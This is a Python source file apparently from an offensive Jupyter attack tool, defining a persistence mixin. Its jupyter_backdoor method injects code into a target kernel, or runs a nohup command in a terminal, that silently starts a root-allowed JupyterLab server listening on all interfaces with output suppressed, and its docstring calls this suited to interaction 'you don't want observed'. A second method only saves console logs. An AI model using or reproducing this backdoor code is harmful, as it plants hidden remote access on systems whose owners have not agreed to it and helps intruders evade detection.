import asyncio
import inquirer
import time
from vger.attack import attack_session, run_ephemeral_terminal


class PersistMixin:
    def jupyter_backdoor(self, port=7777, secret=""):
        """
        Launches a new JupyterLab instance. This can be useful for browser-based interaction that you don't want observed.
        """
        loop = asyncio.get_event_loop()
        if len(secret) == 0:
            config = [
                inquirer.Text(
                    "port",
                    message="What port do you want your Jupyter Server to run on?",
                ),
                inquirer.Text(
                    "secret",
                    message="What password do you want to use for authentication?",
                ),
            ]
            config = inquirer.prompt(config)
            port = config["port"]
            secret = config["secret"]
        if self.target:
            loop.run_until_complete(
                attack_session(
                    self.connection,
                    self.target,
                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
                    silent=True,
                    print_out=False,
                )
            )
            self.connection.print_with_rule(f"Backdoor attempted on {port}")
        else:
            self.connection.print_with_rule("Target needed for backdoor")
            if self.pick_target():
                self.jupyter_backdoor(port=port, secret=secret)
            else:
                self.connection.print_with_rule(
                    "Attempting to spawn Jupyter from shell"
                )
                self.connection.print_with_rule("May fail due to missing dependencies")
                self.connection.print_with_rule("Verify success manually")
                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
                loop.run_until_complete(
                    run_ephemeral_terminal(
                        self.connection, launch_jupyter, stdout=False
                    )
                )
                self.connection.print_with_rule(f"Backdoor attempted on {port}")

    def export_console(self):
        """
        Save anything that's been printed to the console.
        """
        answer = [
            inquirer.Path(
                "path",
                message="What directory would you like to save your output?",
                path_type=inquirer.Path.DIRECTORY,
                exists=True,
            )
        ]
        answer = inquirer.prompt(answer)
        log_path = f"{answer["path"]}vger-{time.strftime("%Y%m%d-%H%M%S")}.log"
        self.connection.con.save_text(log_path)
        self.connection.print_with_rule(f"Log saved to {log_path}")
